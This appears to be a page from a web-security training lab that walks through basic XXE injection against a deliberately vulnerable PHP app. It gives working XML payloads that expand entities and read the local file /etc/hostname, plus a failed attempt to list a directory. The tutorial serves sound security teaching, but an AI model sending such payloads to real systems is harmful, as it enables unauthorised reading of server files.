---
title: "Basic XXE"
weight: 1
---

{{% notice note %}}
Make sure you are on the PHP site (`/php/`) for these exercises.
{{% /notice %}}

In this app, we can see that what is submitted does not have a content-type of XML, but the data does look formatted in XML.

![](/static/img/php_xml.png)

But, it looks like the value of the Email field is reflected back to the user as shown in this image:

![](/static/img/php_xml_reflected.png)

As we did in the Java app, lets test for some basic XXE. We will define two General Entities and place them both in the email field to see if they are interpolated and reflected back to us.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY foo "Does this">
  <!ENTITY bar "expand?">
]>

<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>&foo; &bar;</email>
  <password>pass</password>
</root>
```

Boom. It looks like we can at least include local entities

![](/static/img/php_xxe_expand.png)

Now we are going to see if we can include a local file as the email value:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>&xxe;</email>
  <password>pass</password>
</root>
```

No problems there.

![](/static/img/php_host_name.png)

What about listing the contents of a directory?

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc">
]>

<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>&xxe;</email>
  <password>pass</password>
</root>
```

No, that did not work.

![](/static/img/php_directory_listing.png)

So, we can do most of the same things that we did in Java, with the exception that we are no longer able to list the contents of a directory.
